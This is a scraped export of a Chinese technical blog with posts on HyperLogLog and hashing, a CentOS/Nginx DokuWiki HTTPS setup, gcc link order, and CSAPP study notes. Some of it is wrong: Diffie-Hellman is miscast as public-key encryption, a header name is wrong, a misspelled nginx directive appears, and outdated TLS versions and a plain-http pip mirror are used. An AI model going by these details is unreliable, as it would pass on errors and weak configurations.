k&#x2F;m&#x2F;p 的关系 k&#x2F;m 计算公式 感觉布隆过滤器很像 bitmap，差别在于 bitmap 适用于连续型的数据，因此不需要哈希函数；而布隆则适用于任意类型的数据； HyperLogLogHyperLogLog 主要用于基数计数的场景； 基数计数(Distinct Value)：统计一个集合中不重复的元素个数；例如网站的日活跃 UV 统计、某日搜索的关键词个数统计等；常用方法是设计一个散列表，每次新来的一个元素，判断是否在集合中；若不在则新增，若存在则增加计数；这种方法准确率100%，但需要完整的内存存储空间来存放集合中的每一个元素； 优点：相比散列表， HLL 非常节省内存； 缺点：它是一种概率算法，有一定的概率会误报；但结果基本准确； 例如对于 10^9 的基数，只需 1.5KB 的内存，即可实现 2% 标准差的统计结果； 问题模拟数据库中有某日访问某个页面的访问记录，记录的字段包含有用户名，部分用户存在多次访问该页面的情况，求：共有多少个不重复的用户在该日访问了该页面？ 问题解法暴力法计算出每条记录中的用户名的哈希值；从所有的哈希值寻找最大的连续0的个数，假设为 k；根据 k 算得该页面不重复的访问用户数量约为 2^(k+1) 这个解法并不准确，不能应对极端事件，例如当1000万次访问全部是由一个用户请求的时候； 分桶法 将每个哈希值分成两段，第一段做为桶的编号，第二段用来计算k（即连续0的个数） 假设分成了10000个桶，最后 k 取这10000个的平均值； 假设1000万次访问全部是一名用户，则所有的记录都会被分成到一个桶，剩下的9999个桶的 k 值都为 0，因此计算出来的 k 的平均值就会变小很多；桶数越大，k 值的偏差越小； 基数估计 &#x3D; 桶数 * (2 ^ 平均 k) m 代表桶数；R 代表均值 k；constant 代表常数，用来修正（其计算公式附后）； 分桶法改进在分桶法中，k 使用平均值，但平均值的缺点是容易受到一些极端数值的影响；为了避免这个缺点，改为使用调和平均法，来求取 k 值； Hn 代表 2^(调和平均 k 值)；xi 代表单次的基数估计值，它等于 2^(ki + 1)；n 代表总的桶数 ； 改进后的基数统计公式如下： 当数据量很小的时候，上面的公式计算出来的结果偏差会比较大，因此需要引入一个条件判断，当数据量小于某个临界时，使用其他计算方式 12345if DV &lt; (5 / 2) * m: DV = m * log(m/V)# V 代表结果为 0 的桶的数量；# m 代表桶数；# DV 代表按前面的公式计算出来的结果 桶数 m 的选择：根据想要控制达到的相对标准差值 RSD（relative standard deviation）来计算： 常数 constant 的选择： m 表示桶数 12345678910switch (p) &#123; case 4: constant = 0.673 * m * m; case 5: constant = 0.697 * m * m; case 6: constant = 0.709 * m * m; default: constant = (0.7213 / (1 + 1.079 / m)) * m * m;&#125; SHA 算法在创建散列表时，里面会用到某种散列函数，它会将一个键名，转成一个索引，从而能够在 O(1) 的时间内，找到值存储的位置； 用途 比较文件：使用同一个散列函数，计算两个文件的散列值；如果值相同，则意味着这两个文件相同； 检查密码：服务器不存储用户的密码，而是存储其密码的散列值，这样即使服务器上面的密码被泄露，也不会导致用户的密码暴露； SHA 算法包括 SHA-0, SHA-1, SHA-2, SHA-3，前两个被证明有缺陷，一般使用后两个； 局部敏感的散列算法散列函数默认是局部不敏感的，即输入值即使只有细微的差异，输出值都会有巨大的不同；但有时候也需要局部敏感的散列函数，用来判断两个事物是否非常相似； 用途 Google 判断某个网页是否已经收集； 判断论文是否抄袭； 判断用户上传的文档或图书是否侵犯了版权； Diffie-Hellman 密钥交换即公钥和私钥，发信人使用公钥进行加密；加密后的内容只有私钥持有者才能打开； Diffie-Hellman 算法的替代者为 RSA 算法； 线性规划用途：在给定约束条件下最大限度的改善指定的指标； 例子 有限的原材料，生产两种产品，如何获得利润最大化； 有限的时间和资金，在两个不同的州分别获取选票，如果将选票数量最大化； 所有的图算法都可以使用线性规划来实现，图问题只是其中一个子集；线性规划使用 Simplex 算法；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://example.com/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"CentOS/Nginx 安装 Dokuwiki 支持 Https 访问","slug":"CentOS Nginx 安装 Dokuwiki 支持 Https 访问","date":"2019-10-20T04:02:39.000Z","updated":"2024-09-21T23:13:50.124Z","comments":true,"path":"2019/10/20/CentOS Nginx 安装 Dokuwiki 支持 Https 访问/","permalink":"http://example.com/2019/10/20/CentOS%20Nginx%20%E5%AE%89%E8%A3%85%20Dokuwiki%20%E6%94%AF%E6%8C%81%20Https%20%E8%AE%BF%E9%97%AE/","excerpt":"","text":"更新工具包 注：此更新步骤仅为建议，非必须 12sudo yum -y updatesudo yum -y install vim bash-completion wget tar 更新后重启系统 1sudo reboot 安装工具包12345sudo yum install epel-release yum-utilssudo yum install http://rpms.remirepo.net/enterprise/remi-release-7.rpmsudo yum makecache fastsudo yum-config-manager --disable remi-php54sudo yum-config-manager --enable remi-php72 安装 php 和 Nginx 注：若二者已安装，此步可跳过 123sudo yum -y install php-cli php-fpm php-mysql php-zip php-ldap sudo yum -y install php-devel php-gd php-mcrypt php-mbstring sudo yum -y install php-curl php-xml php-pear php-bcmath 安装好了后，检查一下 php 版本 1php -v 若正常，会显示如下信息： 123PHP 7.2.10 (cli) (built: Sep 11 2018 11:22:20) ( NTS )Copyright (c) 1997-2018 The PHP GroupZend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies 注：此处略去安装 Nginx 过程，如有需要，请参考其他教程 安装 Dokuwiki下载前，先到 Github 检查一下它的最新稳定版本，此处假设为”2018-04-22b” 12export RELEASE=&quot;2018-04-22b&quot;wget https://github.com/splitbrain/dokuwiki/archive/release_stable_$&#123;RELEASE&#125;.tar.gz 解压下载的安装包，并转移到新建的文件夹 &#x2F;var&#x2F;www&#x2F;html&#x2F; 中 123tar xvf release_stable_$&#123;RELEASE&#125;.tar.gzsudo mkdir -p /var/www/html/ sudo mv dokuwiki-release_stable_$&#123;RELEASE&#125; /var/www/html/dokuwiki 将文件夹 &#x2F;var&#x2F;www&#x2F;html&#x2F;dokuwiki 所有者权限修改为 nginx_user:nginx_group 注1：更改文件夹的所有者权限，方便 Nginx 有权访问该文件夹中的内容；此处假设 Nginx 进程运行在 nginx_user:nginx_group 下面，如果不是，则相应修改注2：查看 nginx 所属用户 username 的办法为 ps aux | grep nginx注3：查看某个用户 username 所属组的方法为 groups username 1sudo chown -R nginx_user:nginx_group /var/www/html/dokuwiki 安装 SSL 证书目的：支持使用 https 访问 安装 certbot-auto 到本地的 &#x2F;usr&#x2F;local&#x2F;bin 下目的：方便从 Letsencrypt 机构申请免费证书并简化后续的证书到期更新工作 注：若已安装过 certbot-auto 此步骤可略过 12sudo wget https://dl.eff.org/certbot-auto -P /usr/local/binsudo chmod a+x /usr/local/bin/certbot-auto 配置 pip 国内源注：若之前已配置，请跳过此步骤；此步骤的目的是加速 CertBot 下载 python 模块的速度 12345678910# 新建 .pip 文件夹并进入mkdir .pip &amp;&amp; cd .pip# 创建 pip.conf 文件vi pip.conf# 在 pip.conf 文件中输入以下内容[global]index-url=http://mirrors.aliyun.com/pypi/simple/[install]trusted-host=mirrors.aliyun.com# 保存退出 运行脚本，安装依赖1/usr/local/bin/certbot-auto --help 配置 nginx目的：获取域名证书过程中， Let’s Encrypt 会对域名发起访问，以确认申请者对域名的所有权；故需要配置 nginx，以便能够对 Let’s Encrypt 的访问返回正确的响应； 1234# 创建文件夹，用于 Let&#x27;s Encrypt 访问时返回响应内容mkdir /home/letsencrypt# 打开 nginx 配置文件进行编辑，此处假设 nginx 的配置文件在以下路径：/usr/local/nginx/conf/nginx.conf，如不是，则相应修改路径vi /usr/local/nginx/conf/nginx.conf 1234567891011121314// 在 nginx 配置文件中，找到 http，添加一条监听 80 端口的新 serverhttp &#123; //...(略)... // 添加如下内容，此处假设申请域名为 domain.example.com，请修改为实际申请的域名 server &#123; listen 80; server_name domain.example.com; location ~ /.well-known/acme-challenge/ &#123; defaulf_type &quot;text/plain&quot;; root /home/letsencrypt/; &#125; &#125; // ......以下略...... 重启 nginx1234567# 此处假设 nginx 可执行文件在路径 /usr/local/nginx/sbin 下面，如不是则相应修改路径# 先使用 -t 参数测试配置文件格式是否正确/usr/local/nginx/sbin/nginx -t# 若正确，屏幕上将显示以下字样&gt; nginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is ok# 重启 Nginx/usr/local/nginx/sbin/nginx -s reload 运行脚本，申请证书12# 此处为域名 domain.example.com 申请一张证书，其中的 youremail.com 请替换为你自己的邮箱地址/usr/local/bin/certbot-auto certonly --email youremail.com --webroot -w /home/letsencrypt -d domain.example.com 申请成功后，界面下会有如下的成功提示： 12345IMPORTANT NOTES:- Congratulations! Your certificate and chain have been saved at /etc/letsencrypt/live/helloworld.com/fullchain.pem. Your cert will expire on 2019-08-26. To obtain a new version of the certificate in the future, simply run Let&#x27;s Encrypt again...... 注：记下以上提示信息中的 fullchain.pem 和 privkey.pem 两个文件路径，后续配置 nginx 会用到 配置 Nginx打开 nginx 配置文件 12# 配置文件的路径请根据实际情况修改vi /usr/local/nginx/conf/nginx.conf 在nginx 配置文件中，新增两个 server 条目，内容如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071server &#123; listen 443 ssl; # 注意替换此处的域名 server_name domain.example.com; root /var/www/html/dokuwiki; access_log /var/log/dokuwiki.access.log; error_log /var/log/dokuwiki.error.log; ssl on; # 注意替换此处的 fullchain.pem 和 privkey.pem 的路径为正确的实际路径 ssl_certificate /etc/letsencrypt/live/domain.example.com/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/domain.example.com/privkey.pem; ssl_session_timeout 5m; ssl_ciphers &#x27;AES128+EECDH:AES128+EDH:!aNULL&#x27;; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_prefer_server_ciphers on; index index.html index.php doku.php; location / &#123; try_files $uri $uri/ @dokuwiki; &#125; location @dokuwiki &#123; rewrite ^/_media/(.*) /lib/exe/fetch.php?media=$1 last; rewrite ^/_detail/(.*) /lib/exe/detail.php?media=$1 last; rewrite ^/_export/([^/]+)/(.*) /doku.php?do=export_$1&amp;id=$2 last; rewrite ^/(.*) /doku.php?id=$1 last; &#125; location ~ /(data|conf|bin|inc)/ &#123; deny all; &#125; location ~* \\.(css|js|gif|jpe?g|png)$ &#123; expires 1M; add_header Pragma public; add_header Cache-Control &quot;public, must-revalidate, proxy-revalidate&quot;; &#125; location ~ \\.php$ &#123; fastcgi_split_path_info ^(.+\\.php)(/.+)$; fastcgi_pass unix:/var/run/php-fpm/php-fpm.sock; fastcgi_index index.php; include fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_intercept_errors off; fastcgi_buffer_size 16k; fastcgi_buffers 4 16k; &#125; location ~ /\\.ht &#123; deny all; &#125;&#125;# 若想支持 80 端口访问，则可以在原监听 80 端口的 server 条目中添加一些信息server &#123; listen 80; server_name domain.example.com; location ~ /.well-known/acme-challenge/ &#123; defaulf_type &quot;text/plain&quot;; root /home/letsencrypt/; &#125; # 以上是 location 原申请证书时已写好的信息，下面的新 location 是需要新添加的信息 location / &#123; add_header Strict-Transport-Security max-age=2592000; rewrite ^ https://$host$request_uri? permanent; &#125;&#125; 配置 php-fpm打开以下 php-fpm 中的文件 1sudo vim /etc/php-fpm.d/www.conf 将文件中以下几个键的值设置为如下： 1234567# 注意替换此处的 nginx_user 和 nginx_group 为实际的用户名和用户组user = nginx_usergroup = nginx_grouplisten = /var/run/php-fpm/php-fpm.socklisten.owner = nginx_userlisten.group = nginx_grouplisten.mode = 0660 启动 nginx 和 php-fpm 12sudo systemctl start php-fpmsudo systemctl enable php-fpm 重启 Nginx 123456# 先使用 -t 参数测试配置文件格式是否正确/usr/local/nginx/sbin/nginx -t# 若正确，屏幕上将显示以下字样&gt; nginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is ok# 重启 Nginx/usr/local/nginx/sbin/nginx -s reload 配置 DokuWiki使用浏览器打开网址：https://domain.example.com/install.php，打开后页面如下，配置方法请参考其他教程 注：domain.example.com 请相应替换为实际域名 其他Letsenctrypt 的证书有效期为三个月，当剩余一个月时，Letsenctrypt 会发通知邮件到预留的邮箱；收到通知后，只需要登录服务器，运行相关命令，即可自动更新证书 12# 先使用 --dry-run 选项进行测试，非真正执行更新/usr/local/bin/certbot-auto renew --dry-run 若显示如下字样，则表示自动更新功能测试成功 1234Congratulations, all renewals succeeded. The following certs have been renewed: /etc/letsencrypt/live/www.helloworld.com/fullchain.pem (success)** DRY RUN: simulating &#x27;certbot renew&#x27; close to cert expiry** (The test certificates above have not been saved.) 运行以下实际的更新命令，更新完了后，记得重启 nginx 服务器，以便启用新的证书 1/usr/local/bin/certbot-auto renew -v","categories":[{"name":"运维","slug":"运维","permalink":"http://example.com/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"服务器","slug":"服务器","permalink":"http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"}]},{"title":"gcc 链接器工作原理","slug":"gcc 链接器工作原理","date":"2019-09-28T14:22:33.000Z","updated":"2024-09-21T23:14:35.994Z","comments":true,"path":"2019/09/28/gcc 链接器工作原理/","permalink":"http://example.com/2019/09/28/gcc%20%E9%93%BE%E6%8E%A5%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/","excerpt":"","text":"问题在编译源代码为可执行文件的时候，如果需要链接静态库，我们可能会遇到如下错误提示： 12: In function &#x27;main&#x27; // 或者其他函数名(.text+0x7): undefined reference to &quot;foo&quot; // 或其他变量名 编译出现了失败，提示找不到某些函数或变量的定义。但经过仔细检查核对，发现我们已经在编译命令中，提供了完整的库名称和库路径，因此找不到问题出在哪里 原因分析出现这种问题的原因，很可能是在于静态库之间存在相互依赖，以及链接器的工作方式与我们预期不同造成的，在找出解决办法前，我们可以先了解一下编译器的工作流程 编译及链接流程假设我们的编译命令如下， 1gcc f.c libx.a liby.a libz.a 编译编译器检查命令行中列出的文件，如果发现有 .c 文件，先将所有 .c 的文件翻译成 .o 文件，确保最后只剩下 .o 文件和 .a 文件 链接链接器出场，从左到右开始扫描，进行符号解析工作 1. 建立三个空的集合E 空文件集合：放入该集合中的文件，后续将用于合成最终的可执行文件；U 空符号集合：用来存放在当前目标文件中引用，但没有定义的符号；D 空符号集合：用来存放 E 集合的文件中那些已经定义的符号 注：E\\U\\D，此处分别表示 Empty, Undefined, Defined 2. 从左到右依次扫描每一个文件假设当前扫描到的第一个文件为 f 如果 f 是一个 .o 结尾的目标文件将 f 放入 E 文件集合中将 f 文件中定义的符号添加到 D 符号集合中将 f 文件中引用却未定义的符号，添加到 U 符号集合中； 如果 f 是一个 .a 结尾的存档文件 注：存档文件即静态库文件，它由一个或多个目标文件做为成员打包组成的，假设 f 中的第一个目标文件叫 m 第一步：匹配检查 U 集合中未定义的符号是否在 m 的符号表中 如果没有 抛弃 m，继续扫描 f 中的下一个成员文件； 如果有 将 m 加入 E 集合中； 将 m 中定义的符号添加到 D 符号集合中 将 m 中引用却未定义的符号，添加到 U 符号集合中； 第二步：重复继续扫描 f 中的下一个成员文件，重复上一步的匹配过程，直到 U 和 D 都不再发生变化； 第三步：筛选将所有在 f 中但却不包含在 E 集合中的目标文件成员，抛弃； 3. 重复上一步，直到扫描完所有的输入文件4. 检查 U 符号集合如果 U 非空，则抛出错误，表示存在未定义的引用，并终止；如果 U 为空，则合并和重定位 E 文件集合中的所有目标文件，生成最终的可执行文件，成功； 问题解决思路在了解了编译器工作的流程后，我们会发现，当我们有多个静态库需要链接时，如果这些静态库之间存在依赖关系时，则对静态库的放置顺序是有要求的，即被依赖的库必须放置在依赖者的后面，否则链接器就会找不到未定义的符号；例如 x.a 中引用了 y.a 中定义的函数，则 x.a 必须放置在 y.a 的前面，即正确的顺序应为 1gcc main.c libx.a liby.a 库的顺序规则 惯例：将所有库文件放在命令行的末尾，即在所有 .c 和 .o 文件的后面 如果所有库之间相互独立，那么天下太平，正常编译，回家睡觉 如果所有库之间存在引用，那么需要排列这些库的顺序 确保被引用的库排在引用者的后面 如果二者相互引用，则需要重复输入库名例如：假设 foo 引用 x 库，x 库引用了 y 库，y 库又引用了 x 库，即foo -&gt; x -&gt; y -&gt; x，那么编译命令的顺序如下，其中 x 库需要输入两次1gcc foo.c libx.a liby.a libx.a","categories":[{"name":"文章","slug":"文章","permalink":"http://example.com/categories/%E6%96%87%E7%AB%A0/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"C","slug":"C","permalink":"http://example.com/tags/C/"}]},{"title":"深入理解计算机系统-再总结","slug":"深入理解计算机系统-再总结","date":"2019-09-26T01:04:00.000Z","updated":"2024-09-22T23:08:43.598Z","comments":true,"path":"2019/09/26/深入理解计算机系统-再总结/","permalink":"http://example.com/2019/09/26/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E5%86%8D%E6%80%BB%E7%BB%93/","excerpt":"","text":"计算机系统漫游 编译原理 预处理：将引用文件插入源文件； 编译：将源文件转成汇编代码； 汇编：将汇编代码转成机器代码； 链接：将多个机器代码文件合并成一个文件（可执行文件） 系统的硬件组成：CPU、内存、I&#x2F;O设备，三者通过主板连接起来，并使用主板上的总线互相传输数据； 由于 CPU 和内存之间的速度差异，中间引入多级调整缓存的机制，每一级做为下一级的缓存，利用程序的时间和空间局部性原理，来提高数据读写性能； 信息的表示和处理 C 语言通过 &lt;stdin.h&gt; 头文件的宏，来解决不同数据类型在不同种类机器上的长度不同问题，实现可移植性； C 语言中由于存在无符号类型，当它与其他类型的整数一起计算时，会触发类型转换，导致可能计算出错，所以应特别小心； 无符号整数使用原码表示法，有符号整数使用补码表示法；小数使用 IEEE 表示法，或者定点表示法； IEEE 浮点表示法，将小数表示为 (-1)s * M * 2E 的方式，这种方式可以用来表示非常小的小数；M 取值在 1-2 之间或者在 0-1之间；E 的取值范围在 -127127 之间（单精度）或 -10221023 之间（双精度） 浮点运算不具备交换律和结合律，故计算时要小心； 程序的机器级表示 机器级编程的两个重要抽象：指令集、虚拟内存； 常见指令包括：算术运算（加减乘除）、逻辑运算（与&#x2F;或&#x2F;非&#x2F;异或）、移位、传送、跳转、比较、返回、压栈&#x2F;出栈、加载地址、递增&#x2F;递减； 结构的实现方式：结构头指针+偏移量； 数据在内存中大小一般以 8 字节长度的倍数进行分配，即使数据本身不需要那么大；原因在于 CPU 取值时，是按 8 的倍数的内存地址来取的，以避免不足8字节，却跨2个8字节存储，导致取两次； C 语言中的指针是一种数据类型，它包含所指向对象的长度信息，这样计算指针的偏移的时候，才能够自动加上对象的长度，得到正确的结果；当强制改变指针的类型时，会导致其计算的偏移量发生变化； 在函数调用的时候，由于上一个函数可能有部分数据存放于寄存器中，而这些寄存器接下来马上要给被调用函数使用，因此，上一个函数在跳转前，需要提前将自己的数据保存一份下来；待跳转回来的时候，才能够恢复跳转前的状态； 浮点数的运算，使用与整数不同的另外一系列指令，但二者的风格大致相同； 处理器体系结构 实现数字系统需要有三个部分：电路组合逻辑、存储单元、时钟信号； 电路组合逻辑是由多个逻辑门组合而成的，它能够实现的功能是根据输入的电信号，按某种设定好的规则，产生输出的电信号； 处理器的流水线阶段：取指、译码、执行、访存、写回； 感觉整个处理器的流水线作业状态，像极了工厂里面的流水线操作；当发生异常的时候，全线暂停，根据异常跳转表，呼叫相应的负责人过来收拾现场，之后要么从中断处继续，要么撤线，切换为新产品（其他进程）； 流水线冒险的三种常见处理方式：暂停、气泡、转发； 优化程序性能 优化三板斧：选择合适的算法和数据结构；确保源代码能够被编译器翻译成高效的目标代码；将单个大任务拆分成多个并行的小任务； 注意事项：减少不必要的过程调用、减少不必要的内存引用、减少循环中的重复计算； 先使用工具分析性能瓶颈，之后再有针对性的进行改进； 存储器层次结构 随机访问存储器有动态和静态两种，后者的实现需要更大的晶体管，因此单位面积更大一些，成本更高，功耗更大，但速度也相应更快； 内存模块（即内存条）由多个内存芯片组成，同一个字节的数据在多个内存芯片之间是分段存储的，这样可以提高读写效率； 在由多个盘片组成的磁盘上面，同一个字节的数据也是分段存储的，目的也同样是可以提高读写效率； 磁盘读写时间由三部分组成：寻道时间（最大头）、旋转时间、传送时间（最小头）； 磁盘控制器通过抽象“盘面+磁道+扇区”的三元逻辑地址，与内核进行数据读写的通信； 缓存策略可行的原因在于局部性，即取指和数据引用的局部性； 由于标记位+索引位可以用来标记唯一的内存块，但是缓存块却只用索引位来唯一标识，因此这会导致多个不同标记位的内存块，映射相同的缓存块；而由于索引位在地址的中段，因此，保证了缓存块映射内存块的离散性，这样才可以利用局部性的原理； 链接 重定位是一个很有意思的过程；在合并生成可执行文件，可重定位的目标文件，并不知各个符号最终的内存地址；因此，对于每一处的符号引用，它先在重定位节中为其生成一个条目；待有了最终运行时的地址后，它遍历这个条目列表，将每一处的符号引用，替换为正确的运行时地址； 可执行的目标文件，相对于可重定位的目标文件，增加了两个小节，同时也去掉两个小节；增加的两个小节是段头部表、init 节，去掉的两节是 .rel.text 节和 .rel.data，这两个节是用来重定位用的，由于可执行文件已经完成了链接合并，所以这两个小节就不再需要了； 通过 execve 函数调用加载器，从磁盘加载可执行文件到内存时，一开始并没有发生实际的数据复制操作，而只是在虚拟内存中分配了相应的空间，并标注为未缓存，然后等到某个块真正需要被使用时，才会触发缺页异常，从而开始真正的从磁盘复制数据到物理内存的工作，并相应的完成虚拟内存与物理内存的映射； 共享库可以被多个程序引用，因此它在物理内存中只有一个副本，而不同程序的虚拟内存中各有一段空间与该物理内存进行映射；动态库文件是存在变化的可能性的，即本次加载跟下次加载的两个文件，虽然文件名一样，但内容可能发生了变化，因此它们连大小都可能是不同的；初步设想，在加载的时候，根据文件路径找到文件后，需要从文件的头部信息获取文件的大小，然后在虚拟内存中分配相应的空间；在有了头部的虚拟地址后，根据共享库中的偏移表，计算出所有符号表的符号的全局地址，然后更新程序的符号引用为相应的地址； 共享库本质是一个由机器代码组成的文件，因此它的代码节符合 CPU 的指令集格式；对于第三方语言，例如 JAVA 和 PYTHON，它们可以通过操作系统提供的一组共享库操作函数，实现调用由 C&#x2F;C++ 创建的共享库代码；这便是第三方语言与 C&#x2F;C++ 的实现原理； 异常控制流 异常是操作系统和硬件之间合作的一种接口，在 CPU 眼里，只有 I&#x2F;O 和主存两种设备；CPU 与 I&#x2F;O 使用中断机制进行配合；CPU 与内存使用故障机制进行配合（即缺页异常）；同时，异常也是应用程序调用内核服务的一种配合机制（即 trap 陷阱或 syscall 系统调用）； 当发生异常时，需要调用提前准备好的异常处理程序来处理现场，此时需要先将整个处理器的状态保存下来，以便将异常处理程序完成工作后，可以恢复到异常发生前的现场状态；因此，引入了内核栈来保存状态；调用异常处理程序，很像调用一个普通的函数，只是它使用内核栈，而不是用户栈，而且这段函数将运行在内核模式下，这意味着它对所有资源拥有完全的访问权限； 疑问：内核栈在哪里？貌似是在虚拟内存中的内核段； 异常处理程序貌似也是在虚拟内存中的内核代码段； 进程是操作系统为应用程序提供的一种抽象，其中有一项重要的功能是将内核代码映射到虚拟内存中的内核段，同时这一段中还有内核栈和堆，用来保存内核模式下的上下文状态；当发生系统调用时，控制权会转移到内核代码中的指令，同时通过改变控制位，实现用户模式到内核模式的切换； 不同进程间的调度，除了改变程序计数器，使其指向新进程的某条指令外，还需要改变页表寄存器，使其指向新进程的页表，这样才能实现正确的虚拟内存和物理内存的映射； 创建进程的两种方式：fork 和 execve；前者复制当前的虚拟地址空间，创建一个子进程；后者直接覆盖当前的虚拟地址空间，但会继承原来的文件描述符，同时可接收参数变量和环境变量参数数组； 信号可以用来实现进程间的通信，但它也有一些自己的缺点，例如不排队（即最多只能有一个相同信号处于待处理的状态）；可中断（即捕获信号并调用相应处理程序的过程中，可能会被其他信号中断）；不可移植（不同操作系统对信号的语义定义有所不同，因此需要统一封装，以实现可移植的一致效果） 使用 sigsuspend 函数来显式等待信号，可以兼顾性能和正确性； 虚拟内存 虚拟内存的三大作用：协助实现缓存、简化内存管理、实现内存保护； 虚拟内存的代价是增加了翻译工作；虚拟地址与物理地址的映射关系，需要保存在物理内存中的页表数据结构中；因此，理论上要得到翻译结果，就需要按虚拟地址到内存中查询相应的物理地址；根据程序的局部性原理，可以通过引入缓存机制，加快翻译工作，避免每次都到内存中查询； 页表的设计跟高速缓存的设计密切相关，因为它们都涉及页单元的大小，还好这两个部分都在 CPU 内部，因此可以避免不兼容的风险； 页表负责虚拟地址到物理地址中的页的完整映射，因此貌似这个信息在内存中必须是完整保存的，不然就无法实现查询；为了提高访问速度，利用局部性原理引入缓存机制很有必要；但如果将整个页表都缓存起来，显然成本过高；因此，通过引入多级页表的方式，实现用一个较少的缓存空间，映射一个全量页表的目的；虽然还是有可能发生不命中，但是由于局部性原理的存在，这种概率并不高，从而实现了速度和成本之间的平衡； 虚拟内存中的内核段非常有意思，它有三部分组成，分别是：内核代码和数据（每个进程都相同），物理内存段（每个进程都相同，与实际的物理内存完全一一对应）、进程自身相关信息的数据结构段； 由于部分程序使用的数据，是在运行过程中，由外部输入的，而我们无法提前知道这些数据的大小，因此使用堆的机制，来动态分配存储空间是必不可少的；虽然虚拟内存接近无限大小，但是物理内存却是有限的，因此，对于部分不再使用的虚拟内存空间，对其回收是有必要的，因为对它们的回收，也同时意味着对物理内存的回收释放；因此，如果最有效率的使用堆空间变成一个有待解决的问题； 虚拟堆空间是否连续，跟物理内存空间是否连续，貌似并没直接的关系；那么要如何实现物理内存的连续和最有效化使用？由于物理内存不需要连续存储，貌似它或许可以不管碎片化的问题？而只需要做好标记工作，表示当前空间是否空闲或者已分配即可？如果是这样的话，那么接下来的问题变成是虚拟堆内存如何及时回收自己不用的那部分空间，以便改变物理内存的标记，让其他程序可以使用； 由于虚拟堆空间接近无限，但其实它也不是真的无限，还是有地址上限的；如果对它的地址增长不加以限制的话，有可能会突破这个上限，导致无法再分配内存；这就导致了需要引入及时对已经标记空闲的内存块进行合并，以及重复利用的机制； 垃圾回收：由于 C&#x2F;C++ 语言中，没有给指针保存类型信息，这导致无法判断某个字节的数据是指针类型，还是整数类型，或者其他类型；因此也埋下了隐患，即在遍历某个内存块中的字节时，无法判断某个字节是否为指针并指向其他块；这样导致无法判断某个块是否有其他块中的指针在指向它，从而也无法判断该块是否已经无人指向它变成了垃圾有待回收；在 C++ 中，编译器可以知道现在有哪些块，然后有每个块的大小信息和起始地址，因此它按块头地址大小维护一个二叉树，然后判断每一个指针是否在某个块的起始和终止的地址段中，来判断该指针所指向的块是否仍然有效，若无效，则回收该指针所指向的块；若有效，则不回收；这是一种保守的回收方式，它不会误回收有用的块，但却会漏过一些已经成为垃圾的块（即某个块已经不可达，但却发现不了） 假设在 C 语言中某个函数 A 内部动态分配了内存块，在A函数返回后，假设没有主动释放它，那么指向该块的局部指针变量消失了，但块仍然存在，一直无法被发现并释放； 印象中 C++ 可以使用智能指针通过引用计数来实现垃圾回收； 系统级I&#x2F;O 所有的输入输出设备都被抽象为文件；主存与设备间的数据传输也因此抽象为对文件的读取和写入；当打开一个文件时，内核会为该文件创建一个数据结构，存放该文件的相关属性信息，例如类型、大小、当前位置等，同时使用一个文件描述符来代表它；应用程序使用该文件描述符进行文件的相关操作； 对于文件的维护印象中有三级的结构，包括文件描述符表，文件表，文件头表；描述符表是进程私有的，后二者则是所有进程共享的； 文件有很多种类型，不同类型的文件，可以用来实现不同的用途； CSAPP 提供了一组更加健壮的 I&#x2F;O 函数库，即 RIO 包，用于规避 C 标准函数在读取网络套接字时存在的一些缺点； 网络编程 路由器和交换机的区别是什么？路由器主要用来实现网间连接，交换机主要用来实现端口扩展； 当需要发送的数据内容从应用程序出发后，它先由应用层协议如 HTTP 为其加上头部，注明源信息和目的地信息，然后接下来经过各层硬件，包括网卡、路由器、电缆，它们每一层的硬件之间都使用不一样的传输协议，因此每一层都会对上一层发过来的数据，进行再次的加工，并加上自己的头部，然后发往下一层，最终这电缆或者无线WIFI传输出去；而接收方则再根据每一层的协议进行数据内容的解析，最终得到应用层发出的数据； 全球的 IP 地址是由一个非官方机构统一维护的，它给每个国家分配了一些 IP 段以供使用，但是并不是根据每个国家的人口进行分配，导致不同国家每千人的平均可用 IP 地址存在很大的差异，例如美国每千人可用近5000个IP，而中国每千人只有300个 IP 左右，导致在中国 IP 地址非常紧张； socket&#x2F;connect 组合可用于在客户端建立套接字并进行连接，之后可发起请求；socket&#x2F;listen&#x2F;accept 可用于服务端创建套接字，并进行监听以及接受连接请求，实现与客户端的通信； 浏览器首次向某个网站发起请求时，估计调用一次 socket&#x2F;connect 函数组合建立连接得到文件描述符，然后通过这个文件描述符发送和接收数据； 服务每次收到某个客户端的首次请求后，通过调用 accept 函数建立连接，得到文件描述符，然后通过它接收到客户端的请求数据，并发送响应给客户端； 在实际使用中，一般使用封装过的 open_clientfd 和 open_listenfd 来替代以上两种组合实现相同的功能，这样更简单和健壮； HTTP 报文使用一回车+一换行符来表示一行的结束，并使用一个空行表示报头的结束； 服务端在接收到请求后，调用 fork+execve 函数加载 &#x2F;cgi-bin&#x2F;adder 程序（即CGI程序），重定位标准输出到已连接描述符；由 CGI 程序负责生成动态内容后，写入标准输出，并写入报头等信息；父进程在创建 CGI 子进程后，会调用 wait 等待其返回；待返回后，回收子进程的资源； 并发编程 几种进程间通信的方法：管道、命名管道、信号、消息队列、共享内存、套接字； 几种并发编程的方法：进程、线程、I&#x2F;O多路复用； 进程并发：为每个请求建立新的子进程，优点是编程简单，缺点是进程切换成本高导致性能较差，进程间共享数据麻烦； I&#x2F;O 多路复用：维持连接池集合，通过请求事件驱动；优点是共享同一进程上下文，性能较好，共享数据方便；缺点是编程麻烦，随着并发粒度越小，难度上升；以及不能利用多核处理器的优势； 